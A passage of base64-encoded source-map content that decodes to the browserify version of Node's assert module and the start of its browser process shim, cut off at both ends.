zdWIgbW9kdWxlcyBjYW4gcGFzc1xuLy8gb3RoZXIga2V5cyB0byB0aGUgQXNzZXJ0aW9uRXJyb3IncyBjb25zdHJ1Y3RvciAtIHRoZXkgd2lsbCBiZVxuLy8gaWdub3JlZC5cblxuLy8gMy4gQWxsIG9mIHRoZSBmb2xsb3dpbmcgZnVuY3Rpb25zIG11c3QgdGhyb3cgYW4gQXNzZXJ0aW9uRXJyb3Jcbi8vIHdoZW4gYSBjb3JyZXNwb25kaW5nIGNvbmRpdGlvbiBpcyBub3QgbWV0LCB3aXRoIGEgbWVzc2FnZSB0aGF0XG4vLyBtYXkgYmUgdW5kZWZpbmVkIGlmIG5vdCBwcm92aWRlZC4gIEFsbCBhc3NlcnRpb24gbWV0aG9kcyBwcm92aWRlXG4vLyBib3RoIHRoZSBhY3R1YWwgYW5kIGV4cGVjdGVkIHZhbHVlcyB0byB0aGUgYXNzZXJ0aW9uIGVycm9yIGZvclxuLy8gZGlzcGxheSBwdXJwb3Nlcy5cblxuZnVuY3Rpb24gZmFpbChhY3R1YWwsIGV4cGVjdGVkLCBtZXNzYWdlLCBvcGVyYXRvciwgc3RhY2tTdGFydEZ1bmN0aW9uKSB7XG4gIHRocm93IG5ldyBhc3NlcnQuQXNzZXJ0aW9uRXJyb3Ioe1xuICAgIG1lc3NhZ2U6IG1lc3NhZ2UsXG4gICAgYWN0dWFsOiBhY3R1YWwsXG4gICAgZXhwZWN0ZWQ6IGV4cGVjdGVkLFxuICAgIG9wZXJhdG9yOiBvcGVyYXRvcixcbiAgICBzdGFja1N0YXJ0RnVuY3Rpb246IHN0YWNrU3RhcnRGdW5jdGlvblxuICB9KTtcbn1cblxuLy8gRVhURU5TSU9OISBhbGxvd3MgZm9yIHdlbGwgYmVoYXZlZCBlcnJvcnMgZGVmaW5lZCBlbHNld2hlcmUuXG5hc3NlcnQuZmFpbCA9IGZhaWw7XG5cbi8vIDQuIFB1cmUgYXNzZXJ0aW9uIHRlc3RzIHdoZXRoZXIgYSB2YWx1ZSBpcyB0cnV0aHksIGFzIGRldGVybWluZWRcbi8vIGJ5ICEhZ3VhcmQuXG4vLyBhc3NlcnQub2soZ3VhcmQsIG1lc3NhZ2Vfb3B0KTtcbi8vIFRoaXMgc3RhdGVtZW50IGlzIGVxdWl2YWxlbnQgdG8gYXNzZXJ0LmVxdWFsKHRydWUsICEhZ3VhcmQsXG4vLyBtZXNzYWdlX29wdCk7LiBUbyB0ZXN0IHN0cmljdGx5IGZvciB0aGUgdmFsdWUgdHJ1ZSwgdXNlXG4vLyBhc3NlcnQuc3RyaWN0RXF1YWwodHJ1ZSwgZ3VhcmQsIG1lc3NhZ2Vfb3B0KTsuXG5cbmZ1bmN0aW9uIG9rKHZhbHVlLCBtZXNzYWdlKSB7XG4gIGlmICghdmFsdWUpIGZhaWwodmFsdWUsIHRydWUsIG1lc3NhZ2UsICc9PScsIGFzc2VydC5vayk7XG59XG5hc3NlcnQub2sgPSBvaztcblxuLy8gNS4gVGhlIGVxdWFsaXR5IGFzc2VydGlvbiB0ZXN0cyBzaGFsbG93LCBjb2VyY2l2ZSBlcXVhbGl0eSB3aXRoXG4vLyA9PS5cbi8vIGFzc2VydC5lcXVhbChhY3R1YWwsIGV4cGVjdGVkLCBtZXNzYWdlX29wdCk7XG5cbmFzc2VydC5lcXVhbCA9IGZ1bmN0aW9uIGVxdWFsKGFjdHVhbCwgZXhwZWN0ZWQsIG1lc3NhZ2UpIHtcbiAgaWYgKGFjdHVhbCAhPSBleHBlY3RlZCkgZmFpbChhY3R1YWwsIGV4cGVjdGVkLCBtZXNzYWdlLCAnPT0nLCBhc3NlcnQuZXF1YWwpO1xufTtcblxuLy8gNi4gVGhlIG5vbi1lcXVhbGl0eSBhc3NlcnRpb24gdGVzdHMgZm9yIHdoZXRoZXIgdHdvIG9iamVjdHMgYXJlIG5vdCBlcXVhbFxuLy8gd2l0aCAhPSBhc3NlcnQubm90RXF1YWwoYWN0dWFsLCBleHBlY3RlZCwgbWVzc2FnZV9vcHQpO1xuXG5hc3NlcnQubm90RXF1YWwgPSBmdW5jdGlvbiBub3RFcXVhbChhY3R1YWwsIGV4cGVjdGVkLCBtZXNzYWdlKSB7XG4gIGlmIChhY3R1YWwgPT0gZXhwZWN0ZWQpIHtcbiAgICBmYWlsKGFjdHVhbCwgZXhwZWN0ZWQsIG1lc3NhZ2UsICchPScsIGFzc2VydC5ub3RFcXVhbCk7XG4gIH1cbn07XG5cbi8vIDcuIFRoZSBlcXVpdmFsZW5jZSBhc3NlcnRpb24gdGVzdHMgYSBkZWVwIGVxdWFsaXR5IHJlbGF0aW9uLlxuLy8gYXNzZXJ0LmRlZXBFcXVhbChhY3R1YWwsIGV4cGVjdGVkLCBtZXNzYWdlX29wdCk7XG5cbmFzc2VydC5kZWVwRXF1YWwgPSBmdW5jdGlvbiBkZWVwRXF1YWwoYWN0dWFsLCBleHBlY3RlZCwgbWVzc2FnZSkge1xuICBpZiAoIV9kZWVwRXF1YWwoYWN0dWFsLCBleHBlY3RlZCwgZmFsc2UpKSB7XG4gICAgZmFpbChhY3R1YWwsIGV4cGVjdGVkLCBtZXNzYWdlLCAnZGVlcEVxdWFsJywgYXNzZXJ0LmRlZXBFcXVhbCk7XG4gIH1cbn07XG5cbmFzc2VydC5kZWVwU3RyaWN0RXF1YWwgPSBmdW5jdGlvbiBkZWVwU3RyaWN0RXF1YWwoYWN0dWFsLCBleHBlY3RlZCwgbWVzc2FnZSkge1xuICBpZiAoIV9kZWVwRXF1YWwoYWN0dWFsLCBleHBlY3RlZCwgdHJ1ZSkpIHtcbiAgICBmYWlsKGFjdHVhbCwgZXhwZWN0ZWQsIG1lc3NhZ2UsICdkZWVwU3RyaWN0RXF1YWwnLCBhc3NlcnQuZGVlcFN0cmljdEVxdWFsKTtcbiAgfVxufTtcblxuZnVuY3Rpb24gX2RlZXBFcXVhbChhY3R1YWwsIGV4cGVjdGVkLCBzdHJpY3QsIG1lbW9zKSB7XG4gIC8vIDcuMS4gQWxsIGlkZW50aWNhbCB2YWx1ZXMgYXJlIGVxdWl2YWxlbnQsIGFzIGRldGVybWluZWQgYnkgPT09LlxuICBpZiAoYWN0dWFsID09PSBleHBlY3RlZCkge1xuICAgIHJldHVybiB0cnVlO1xuICB9IGVsc2UgaWYgKGlzQnVmZmVyKGFjdHVhbCkgJiYgaXNCdWZmZXIoZXhwZWN0ZWQpKSB7XG4gICAgcmV0dXJuIGNvbXBhcmUoYWN0dWFsLCBleHBlY3RlZCkgPT09IDA7XG5cbiAgLy8gNy4yLiBJZiB0aGUgZXhwZWN0ZWQgdmFsdWUgaXMgYSBEYXRlIG9iamVjdCwgdGhlIGFjdHVhbCB2YWx1ZSBpc1xuICAvLyBlcXVpdmFsZW50IGlmIGl0IGlzIGFsc28gYSBEYXRlIG9iamVjdCB0aGF0IHJlZmVycyB0byB0aGUgc2FtZSB0aW1lLlxuICB9IGVsc2UgaWYgKHV0aWwuaXNEYXRlKGFjdHVhbCkgJiYgdXRpbC5pc0RhdGUoZXhwZWN0ZWQpKSB7XG4gICAgcmV0dXJuIGFjdHVhbC5nZXRUaW1lKCkgPT09IGV4cGVjdGVkLmdldFRpbWUoKTtcblxuICAvLyA3LjMgSWYgdGhlIGV4cGVjdGVkIHZhbHVlIGlzIGEgUmVnRXhwIG9iamVjdCwgdGhlIGFjdHVhbCB2YWx1ZSBpc1xuICAvLyBlcXVpdmFsZW50IGlmIGl0IGlzIGFsc28gYSBSZWdFeHAgb2JqZWN0IHdpdGggdGhlIHNhbWUgc291cmNlIGFuZFxuICAvLyBwcm9wZXJ0aWVzIChgZ2xvYmFsYCwgYG11bHRpbGluZWAsIGBsYXN0SW5kZXhgLCBgaWdub3JlQ2FzZWApLlxuICB9IGVsc2UgaWYgKHV0aWwuaXNSZWdFeHAoYWN0dWFsKSAmJiB1dGlsLmlzUmVnRXhwKGV4cGVjdGVkKSkge1xuICAgIHJldHVybiBhY3R1YWwuc291cmNlID09PSBleHBlY3RlZC5zb3VyY2UgJiZcbiAgICAgICAgICAgYWN0dWFsLmdsb2JhbCA9PT0gZXhwZWN0ZWQuZ2xvYmFsICYmXG4gICAgICAgICAgIGFjdHVhbC5tdWx0aWxpbmUgPT09IGV4cGVjdGVkLm11bHRpbGluZSAmJlxuICAgICAgICAgICBhY3R1YWwubGFzdEluZGV4ID09PSBleHBlY3RlZC5sYXN0SW5kZXggJiZcbiAgICAgICAgICAgYWN0dWFsLmlnbm9yZUNhc2UgPT09IGV4cGVjdGVkLmlnbm9yZUNhc2U7XG5cbiAgLy8gNy40LiBPdGhlciBwYWlycyB0aGF0IGRvIG5vdCBib3RoIHBhc3MgdHlwZW9mIHZhbHVlID09ICdvYmplY3QnLFxuICAvLyBlcXVpdmFsZW5jZSBpcyBkZXRlcm1pbmVkIGJ5ID09LlxuICB9IGVsc2UgaWYgKChhY3R1YWwgPT09IG51bGwgfHwgdHlwZW9mIGFjdHVhbCAhPT0gJ29iamVjdCcpICYmXG4gICAgICAgICAgICAgKGV4cGVjdGVkID09PSBudWxsIHx8IHR5cGVvZiBleHBlY3RlZCAhPT0gJ29iamVjdCcpKSB7XG4gICAgcmV0dXJuIHN0cmljdCA/IGFjdHVhbCA9PT0gZXhwZWN0ZWQgOiBhY3R1YWwgPT0gZXhwZWN0ZWQ7XG5cbiAgLy8gSWYgYm90aCB2YWx1ZXMgYXJlIGluc3RhbmNlcyBvZiB0eXBlZCBhcnJheXMsIHdyYXAgdGhlaXIgdW5kZXJseWluZ1xuICAvLyBBcnJheUJ1ZmZlcnMgaW4gYSBCdWZmZXIgZWFjaCB0byBpbmNyZWFzZSBwZXJmb3JtYW5jZVxuICAvLyBUaGlzIG9wdGltaXphdGlvbiByZXF1aXJlcyB0aGUgYXJyYXlzIHRvIGhhdmUgdGhlIHNhbWUgdHlwZSBhcyBjaGVja2VkIGJ5XG4gIC8vIE9iamVjdC5wcm90b3R5cGUudG9TdHJpbmcgKGFrYSBwVG9TdHJpbmcpLiBOZXZlciBwZXJmb3JtIGJpbmFyeVxuICAvLyBjb21wYXJpc29ucyBmb3IgRmxvYXQqQXJyYXlzLCB0aG91Z2gsIHNpbmNlIGUuZy4gKzAgPT09IC0wIGJ1dCB0aGVpclxuICAvLyBiaXQgcGF0dGVybnMgYXJlIG5vdCBpZGVudGljYWwuXG4gIH0gZWxzZSBpZiAoaXNWaWV3KGFjdHVhbCkgJiYgaXNWaWV3KGV4cGVjdGVkKSAmJlxuICAgICAgICAgICAgIHBUb1N0cmluZyhhY3R1YWwpID09PSBwVG9TdHJpbmcoZXhwZWN0ZWQpICYmXG4gICAgICAgICAgICAgIShhY3R1YWwgaW5zdGFuY2VvZiBGbG9hdDMyQXJyYXkgfHxcbiAgICAgICAgICAgICAgIGFjdHVhbCBpbnN0YW5jZW9mIEZsb2F0NjRBcnJheSkpIHtcbiAgICByZXR1cm4gY29tcGFyZShuZXcgVWludDhBcnJheShhY3R1YWwuYnVmZmVyKSxcbiAgICAgICAgICAgICAgICAgICBuZXcgVWludDhBcnJheShleHBlY3RlZC5idWZmZXIpKSA9PT0gMDtcblxuICAvLyA3LjUgRm9yIGFsbCBvdGhlciBPYmplY3QgcGFpcnMsIGluY2x1ZGluZyBBcnJheSBvYmplY3RzLCBlcXVpdmFsZW5jZSBpc1xuICAvLyBkZXRlcm1pbmVkIGJ5IGhhdmluZyB0aGUgc2FtZSBudW1iZXIgb2Ygb3duZWQgcHJvcGVydGllcyAoYXMgdmVyaWZpZWRcbiAgLy8gd2l0aCBPYmplY3QucHJvdG90eXBlLmhhc093blByb3BlcnR5LmNhbGwpLCB0aGUgc2FtZSBzZXQgb2Yga2V5c1xuICAvLyAoYWx0aG91Z2ggbm90IG5lY2Vzc2FyaWx5IHRoZSBzYW1lIG9yZGVyKSwgZXF1aXZhbGVudCB2YWx1ZXMgZm9yIGV2ZXJ5XG4gIC8vIGNvcnJlc3BvbmRpbmcga2V5LCBhbmQgYW4gaWRlbnRpY2FsICdwcm90b3R5cGUnIHByb3BlcnR5LiBOb3RlOiB0aGlzXG4gIC8vIGFjY291bnRzIGZvciBib3RoIG5hbWVkIGFuZCBpbmRleGVkIHByb3BlcnRpZXMgb24gQXJyYXlzLlxuICB9IGVsc2UgaWYgKGlzQnVmZmVyKGFjdHVhbCkgIT09IGlzQnVmZmVyKGV4cGVjdGVkKSkge1xuICAgIHJldHVybiBmYWxzZTtcbiAgfSBlbHNlIHtcbiAgICBtZW1vcyA9IG1lbW9zIHx8IHthY3R1YWw6IFtdLCBleHBlY3RlZDogW119O1xuXG4gICAgdmFyIGFjdHVhbEluZGV4ID0gbWVtb3MuYWN0dWFsLmluZGV4T2YoYWN0dWFsKTtcbiAgICBpZiAoYWN0dWFsSW5kZXggIT09IC0xKSB7XG4gICAgICBpZiAoYWN0dWFsSW5kZXggPT09IG1lbW9zLmV4cGVjdGVkLmluZGV4T2YoZXhwZWN0ZWQpKSB7XG4gICAgICAgIHJldHVybiB0cnVlO1xuICAgICAgfVxuICAgIH1cblxuICAgIG1lbW9zLmFjdHVhbC5wdXNoKGFjdHVhbCk7XG4gICAgbWVtb3MuZXhwZWN0ZWQucHVzaChleHBlY3RlZCk7XG5cbiAgICByZXR1cm4gb2JqRXF1aXYoYWN0dWFsLCBleHBlY3RlZCwgc3RyaWN0LCBtZW1vcyk7XG4gIH1cbn1cblxuZnVuY3Rpb24gaXNBcmd1bWVudHMob2JqZWN0KSB7XG4gIHJldHVybiBPYmplY3QucHJvdG90eXBlLnRvU3RyaW5nLmNhbGwob2JqZWN0KSA9PSAnW29iamVjdCBBcmd1bWVudHNdJztcbn1cblxuZnVuY3Rpb24gb2JqRXF1aXYoYSwgYiwgc3RyaWN0LCBhY3R1YWxWaXNpdGVkT2JqZWN0cykge1xuICBpZiAoYSA9PT0gbnVsbCB8fCBhID09PSB1bmRlZmluZWQgfHwgYiA9PT0gbnVsbCB8fCBiID09PSB1bmRlZmluZWQpXG4gICAgcmV0dXJuIGZhbHNlO1xuICAvLyBpZiBvbmUgaXMgYSBwcmltaXRpdmUsIHRoZSBvdGhlciBtdXN0IGJlIHNhbWVcbiAgaWYgKHV0aWwuaXNQcmltaXRpdmUoYSkgfHwgdXRpbC5pc1ByaW1pdGl2ZShiKSlcbiAgICByZXR1cm4gYSA9PT0gYjtcbiAgaWYgKHN0cmljdCAmJiBPYmplY3QuZ2V0UHJvdG90eXBlT2YoYSkgIT09IE9iamVjdC5nZXRQcm90b3R5cGVPZihiKSlcbiAgICByZXR1cm4gZmFsc2U7XG4gIHZhciBhSXNBcmdzID0gaXNBcmd1bWVudHMoYSk7XG4gIHZhciBiSXNBcmdzID0gaXNBcmd1bWVudHMoYik7XG4gIGlmICgoYUlzQXJncyAmJiAhYklzQXJncykgfHwgKCFhSXNBcmdzICYmIGJJc0FyZ3MpKVxuICAgIHJldHVybiBmYWxzZTtcbiAgaWYgKGFJc0FyZ3MpIHtcbiAgICBhID0gcFNsaWNlLmNhbGwoYSk7XG4gICAgYiA9IHBTbGljZS5jYWxsKGIpO1xuICAgIHJldHVybiBfZGVlcEVxdWFsKGEsIGIsIHN0cmljdCk7XG4gIH1cbiAgdmFyIGthID0gb2JqZWN0S2V5cyhhKTtcbiAgdmFyIGtiID0gb2JqZWN0S2V5cyhiKTtcbiAgdmFyIGtleSwgaTtcbiAgLy8gaGF2aW5nIHRoZSBzYW1lIG51bWJlciBvZiBvd25lZCBwcm9wZXJ0aWVzIChrZXlzIGluY29ycG9yYXRlc1xuICAvLyBoYXNPd25Qcm9wZXJ0eSlcbiAgaWYgKGthLmxlbmd0aCAhPT0ga2IubGVuZ3RoKVxuICAgIHJldHVybiBmYWxzZTtcbiAgLy90aGUgc2FtZSBzZXQgb2Yga2V5cyAoYWx0aG91Z2ggbm90IG5lY2Vzc2FyaWx5IHRoZSBzYW1lIG9yZGVyKSxcbiAga2Euc29ydCgpO1xuICBrYi5zb3J0KCk7XG4gIC8vfn5+Y2hlYXAga2V5IHRlc3RcbiAgZm9yIChpID0ga2EubGVuZ3RoIC0gMTsgaSA+PSAwOyBpLS0pIHtcbiAgICBpZiAoa2FbaV0gIT09IGtiW2ldKVxuICAgICAgcmV0dXJuIGZhbHNlO1xuICB9XG4gIC8vZXF1aXZhbGVudCB2YWx1ZXMgZm9yIGV2ZXJ5IGNvcnJlc3BvbmRpbmcga2V5LCBhbmRcbiAgLy9+fn5wb3NzaWJseSBleHBlbnNpdmUgZGVlcCB0ZXN0XG4gIGZvciAoaSA9IGthLmxlbmd0aCAtIDE7IGkgPj0gMDsgaS0tKSB7XG4gICAga2V5ID0ga2FbaV07XG4gICAgaWYgKCFfZGVlcEVxdWFsKGFba2V5XSwgYltrZXldLCBzdHJpY3QsIGFjdHVhbFZpc2l0ZWRPYmplY3RzKSlcbiAgICAgIHJldHVybiBmYWxzZTtcbiAgfVxuICByZXR1cm4gdHJ1ZTtcbn1cblxuLy8gOC4gVGhlIG5vbi1lcXVpdmFsZW5jZSBhc3NlcnRpb24gdGVzdHMgZm9yIGFueSBkZWVwIGluZXF1YWxpdHkuXG4vLyBhc3NlcnQubm90RGVlcEVxdWFsKGFjdHVhbCwgZXhwZWN0ZWQsIG1lc3NhZ2Vfb3B0KTtcblxuYXNzZXJ0Lm5vdERlZXBFcXVhbCA9IGZ1bmN0aW9uIG5vdERlZXBFcXVhbChhY3R1YWwsIGV4cGVjdGVkLCBtZXNzYWdlKSB7XG4gIGlmIChfZGVlcEVxdWFsKGFjdHVhbCwgZXhwZWN0ZWQsIGZhbHNlKSkge1xuICAgIGZhaWwoYWN0dWFsLCBleHBlY3RlZCwgbWVzc2FnZSwgJ25vdERlZXBFcXVhbCcsIGFzc2VydC5ub3REZWVwRXF1YWwpO1xuICB9XG59O1xuXG5hc3NlcnQubm90RGVlcFN0cmljdEVxdWFsID0gbm90RGVlcFN0cmljdEVxdWFsO1xuZnVuY3Rpb24gbm90RGVlcFN0cmljdEVxdWFsKGFjdHVhbCwgZXhwZWN0ZWQsIG1lc3NhZ2UpIHtcbiAgaWYgKF9kZWVwRXF1YWwoYWN0dWFsLCBleHBlY3RlZCwgdHJ1ZSkpIHtcbiAgICBmYWlsKGFjdHVhbCwgZXhwZWN0ZWQsIG1lc3NhZ2UsICdub3REZWVwU3RyaWN0RXF1YWwnLCBub3REZWVwU3RyaWN0RXF1YWwpO1xuICB9XG59XG5cblxuLy8gOS4gVGhlIHN0cmljdCBlcXVhbGl0eSBhc3NlcnRpb24gdGVzdHMgc3RyaWN0IGVxdWFsaXR5LCBhcyBkZXRlcm1pbmVkIGJ5ID09PS5cbi8vIGFzc2VydC5zdHJpY3RFcXVhbChhY3R1YWwsIGV4cGVjdGVkLCBtZXNzYWdlX29wdCk7XG5cbmFzc2VydC5zdHJpY3RFcXVhbCA9IGZ1bmN0aW9uIHN0cmljdEVxdWFsKGFjdHVhbCwgZXhwZWN0ZWQsIG1lc3NhZ2UpIHtcbiAgaWYgKGFjdHVhbCAhPT0gZXhwZWN0ZWQpIHtcbiAgICBmYWlsKGFjdHVhbCwgZXhwZWN0ZWQsIG1lc3NhZ2UsICc9PT0nLCBhc3NlcnQuc3RyaWN0RXF1YWwpO1xuICB9XG59O1xuXG4vLyAxMC4gVGhlIHN0cmljdCBub24tZXF1YWxpdHkgYXNzZXJ0aW9uIHRlc3RzIGZvciBzdHJpY3QgaW5lcXVhbGl0eSwgYXNcbi8vIGRldGVybWluZWQgYnkgIT09LiAgYXNzZXJ0Lm5vdFN0cmljdEVxdWFsKGFjdHVhbCwgZXhwZWN0ZWQsIG1lc3NhZ2Vfb3B0KTtcblxuYXNzZXJ0Lm5vdFN0cmljdEVxdWFsID0gZnVuY3Rpb24gbm90U3RyaWN0RXF1YWwoYWN0dWFsLCBleHBlY3RlZCwgbWVzc2FnZSkge1xuICBpZiAoYWN0dWFsID09PSBleHBlY3RlZCkge1xuICAgIGZhaWwoYWN0dWFsLCBleHBlY3RlZCwgbWVzc2FnZSwgJyE9PScsIGFzc2VydC5ub3RTdHJpY3RFcXVhbCk7XG4gIH1cbn07XG5cbmZ1bmN0aW9uIGV4cGVjdGVkRXhjZXB0aW9uKGFjdHVhbCwgZXhwZWN0ZWQpIHtcbiAgaWYgKCFhY3R1YWwgfHwgIWV4cGVjdGVkKSB7XG4gICAgcmV0dXJuIGZhbHNlO1xuICB9XG5cbiAgaWYgKE9iamVjdC5wcm90b3R5cGUudG9TdHJpbmcuY2FsbChleHBlY3RlZCkgPT0gJ1tvYmplY3QgUmVnRXhwXScpIHtcbiAgICByZXR1cm4gZXhwZWN0ZWQudGVzdChhY3R1YWwpO1xuICB9XG5cbiAgdHJ5IHtcbiAgICBpZiAoYWN0dWFsIGluc3RhbmNlb2YgZXhwZWN0ZWQpIHtcbiAgICAgIHJldHVybiB0cnVlO1xuICAgIH1cbiAgfSBjYXRjaCAoZSkge1xuICAgIC8vIElnbm9yZS4gIFRoZSBpbnN0YW5jZW9mIGNoZWNrIGRvZXNuJ3Qgd29yayBmb3IgYXJyb3cgZnVuY3Rpb25zLlxuICB9XG5cbiAgaWYgKEVycm9yLmlzUHJvdG90eXBlT2YoZXhwZWN0ZWQpKSB7XG4gICAgcmV0dXJuIGZhbHNlO1xuICB9XG5cbiAgcmV0dXJuIGV4cGVjdGVkLmNhbGwoe30sIGFjdHVhbCkgPT09IHRydWU7XG59XG5cbmZ1bmN0aW9uIF90cnlCbG9jayhibG9jaykge1xuICB2YXIgZXJyb3I7XG4gIHRyeSB7XG4gICAgYmxvY2soKTtcbiAgfSBjYXRjaCAoZSkge1xuICAgIGVycm9yID0gZTtcbiAgfVxuICByZXR1cm4gZXJyb3I7XG59XG5cbmZ1bmN0aW9uIF90aHJvd3Moc2hvdWxkVGhyb3csIGJsb2NrLCBleHBlY3RlZCwgbWVzc2FnZSkge1xuICB2YXIgYWN0dWFsO1xuXG4gIGlmICh0eXBlb2YgYmxvY2sgIT09ICdmdW5jdGlvbicpIHtcbiAgICB0aHJvdyBuZXcgVHlwZUVycm9yKCdcImJsb2NrXCIgYXJndW1lbnQgbXVzdCBiZSBhIGZ1bmN0aW9uJyk7XG4gIH1cblxuICBpZiAodHlwZW9mIGV4cGVjdGVkID09PSAnc3RyaW5nJykge1xuICAgIG1lc3NhZ2UgPSBleHBlY3RlZDtcbiAgICBleHBlY3RlZCA9IG51bGw7XG4gIH1cblxuICBhY3R1YWwgPSBfdHJ5QmxvY2soYmxvY2spO1xuXG4gIG1lc3NhZ2UgPSAoZXhwZWN0ZWQgJiYgZXhwZWN0ZWQubmFtZSA/ICcgKCcgKyBleHBlY3RlZC5uYW1lICsgJykuJyA6ICcuJykgK1xuICAgICAgICAgICAgKG1lc3NhZ2UgPyAnICcgKyBtZXNzYWdlIDogJy4nKTtcblxuICBpZiAoc2hvdWxkVGhyb3cgJiYgIWFjdHVhbCkge1xuICAgIGZhaWwoYWN0dWFsLCBleHBlY3RlZCwgJ01pc3NpbmcgZXhwZWN0ZWQgZXhjZXB0aW9uJyArIG1lc3NhZ2UpO1xuICB9XG5cbiAgdmFyIHVzZXJQcm92aWRlZE1lc3NhZ2UgPSB0eXBlb2YgbWVzc2FnZSA9PT0gJ3N0cmluZyc7XG4gIHZhciBpc1Vud2FudGVkRXhjZXB0aW9uID0gIXNob3VsZFRocm93ICYmIHV0aWwuaXNFcnJvcihhY3R1YWwpO1xuICB2YXIgaXNVbmV4cGVjdGVkRXhjZXB0aW9uID0gIXNob3VsZFRocm93ICYmIGFjdHVhbCAmJiAhZXhwZWN0ZWQ7XG5cbiAgaWYgKChpc1Vud2FudGVkRXhjZXB0aW9uICYmXG4gICAgICB1c2VyUHJvdmlkZWRNZXNzYWdlICYmXG4gICAgICBleHBlY3RlZEV4Y2VwdGlvbihhY3R1YWwsIGV4cGVjdGVkKSkgfHxcbiAgICAgIGlzVW5leHBlY3RlZEV4Y2VwdGlvbikge1xuICAgIGZhaWwoYWN0dWFsLCBleHBlY3RlZCwgJ0dvdCB1bndhbnRlZCBleGNlcHRpb24nICsgbWVzc2FnZSk7XG4gIH1cblxuICBpZiAoKHNob3VsZFRocm93ICYmIGFjdHVhbCAmJiBleHBlY3RlZCAmJlxuICAgICAgIWV4cGVjdGVkRXhjZXB0aW9uKGFjdHVhbCwgZXhwZWN0ZWQpKSB8fCAoIXNob3VsZFRocm93ICYmIGFjdHVhbCkpIHtcbiAgICB0aHJvdyBhY3R1YWw7XG4gIH1cbn1cblxuLy8gMTEuIEV4cGVjdGVkIHRvIHRocm93IGFuIGVycm9yOlxuLy8gYXNzZXJ0LnRocm93cyhibG9jaywgRXJyb3Jfb3B0LCBtZXNzYWdlX29wdCk7XG5cbmFzc2VydC50aHJvd3MgPSBmdW5jdGlvbihibG9jaywgLypvcHRpb25hbCovZXJyb3IsIC8qb3B0aW9uYWwqL21lc3NhZ2UpIHtcbiAgX3Rocm93cyh0cnVlLCBibG9jaywgZXJyb3IsIG1lc3NhZ2UpO1xufTtcblxuLy8gRVhURU5TSU9OISBUaGlzIGlzIGFubm95aW5nIHRvIHdyaXRlIG91dHNpZGUgdGhpcyBtb2R1bGUuXG5hc3NlcnQuZG9lc05vdFRocm93ID0gZnVuY3Rpb24oYmxvY2ssIC8qb3B0aW9uYWwqL2Vycm9yLCAvKm9wdGlvbmFsKi9tZXNzYWdlKSB7XG4gIF90aHJvd3MoZmFsc2UsIGJsb2NrLCBlcnJvciwgbWVzc2FnZSk7XG59O1xuXG5hc3NlcnQuaWZFcnJvciA9IGZ1bmN0aW9uKGVycikgeyBpZiAoZXJyKSB0aHJvdyBlcnI7IH07XG5cbnZhciBvYmplY3RLZXlzID0gT2JqZWN0LmtleXMgfHwgZnVuY3Rpb24gKG9iaikge1xuICB2YXIga2V5cyA9IFtdO1xuICBmb3IgKHZhciBrZXkgaW4gb2JqKSB7XG4gICAgaWYgKGhhc093bi5jYWxsKG9iaiwga2V5KSkga2V5cy5wdXNoKGtleSk7XG4gIH1cbiAgcmV0dXJuIGtleXM7XG59O1xuIiwiLy8gc2hpbSBmb3IgdXNpbmcgcHJvY2VzcyBpbiBicm93c2VyXG52YXIgcHJvY2VzcyA9IG1vZHVsZS5leHBvcnRzID0ge307XG5cbi8vIGNhY2hlZCBmcm9tIHdoYXRldmVyIGdsb2JhbCBpcyBwcmVzZW50IHNvIHRoYXQgdGVzdCBydW5uZXJzIHRoYXQgc3R1YiBpdFxuLy8gZG9uJ3QgYnJlYWsgdGhpbmdzLiAgQnV0IHdlIG5lZWQgdG8gd3JhcCBpdCBpbiBhIHRyeSBjYXRjaCBpbiBjYXNlIGl0IGlzXG4vLyB3cmFwcGVkIGluIHN0cmljdCBtb2RlIGNvZGUgd2hpY2ggZG9lc24ndCBkZWZpbmUgYW55IGdsb2JhbHMuICBJdCdzIGluc2lkZSBhXG4vLyBmdW5jdGlvbiBiZWNhdXNlIHRyeS9jYXRjaGVzIGRlb3B0aW1pemUgaW4gY2VydGFpbiBlbmdpbmVzLlxuXG52YXIgY2FjaGVkU2V0VGltZW91dDtcbnZhciBjYWNoZWRDbGVhclRpbWVvdXQ7XG5cbmZ1bmN0aW9uIGRlZmF1bHRTZXRUaW1vdXQoKSB7XG4gICAgdGhyb3cgbmV3IEVycm9yKCdzZXRUaW1lb3V0IGhhcyBub3QgYmVlbiBkZWZpbmVkJyk7XG59XG5mdW5jdGlvbiBkZWZhdWx0Q2xlYXJUaW1lb3V0ICgpIHtcbiAgICB0aHJvdyBuZXcgRXJyb3IoJ2NsZWFyVGltZW91dCBoYXMgbm90IGJlZW4gZGVmaW5lZCcpO1xufVxuKGZ1bmN0aW9uICgpIHtcbiAgICB0cnkge1xuICAgICAgICBpZiAodHlwZW9mIHNldFRpbWVvdXQgPT09ICdmdW5jdGlvbicpIHtcbiAgICAgICAgICAgIGNhY2hlZFNldFRpbWVvdXQgPSBzZXRUaW1lb3V0O1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgY2FjaGVkU2V0VGltZW91dCA9IGRlZmF1bHRTZXRUaW1vdXQ7XG4gICAgICAgIH1cbiAgICB9IGNhdGNoIChlKSB7XG4gICAgICAgIGNhY2hlZFNldFRpbWVvdXQgPSBkZWZhdWx0U2V0VGltb3V0O1xuICAgIH1cbiAgICB0cnkge1xuICAgICAgICBpZiAodHlwZW9mIGNsZWFyVGltZW91dCA9PT0gJ2Z1bmN0aW9uJykge1xuICAgICAgICAgICAgY2FjaGVkQ2xlYXJUaW1lb3V0ID0gY2xlYXJUaW1lb3V0O1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgY2FjaGVkQ2xlYXJUaW1lb3V0ID0gZGVmYXVsdENsZWFyVGltZW91dDtcbiAgICAgICAgfVxuICAgIH0gY2F0Y2ggKGUpIHtcbiAgICAgICAgY2FjaGVkQ2xlYXJUaW1lb3V0ID0gZGVmYXVsdENsZWFyVGltZW91dDtcbiAgICB9XG59ICgpKVxuZnVuY3Rpb24gcnVuVGltZW91dChmdW4pIHtcbiAgICBpZiAoY2FjaGVkU2V0VGltZW91dCA9PT0gc2V0VGltZW91dCkge1xuICAgICAgICAvL25vcm1hbCBlbnZpcm9tZW50cyBpbiBzYW5lIHNpdHVhdGlvbnNcbiAgICAgICAgcmV0dXJuIHNldFRpbWVvdXQoZnVuLCAwKTtcbiAgICB9XG4gICAgLy8gaWYgc2V0VGltZW91dCB3YXNuJ3QgYXZhaWxhYmxlIGJ1dCB3YXMgbGF0dGVyIGRlZmluZWRcbiAgICBpZiAoKGNhY2hlZFNldFRpbWVvdXQgPT09IGRlZmF1bHRTZXRUaW1vdXQgfHwgIWNhY2hlZFNldFRpbWVvdXQpICYm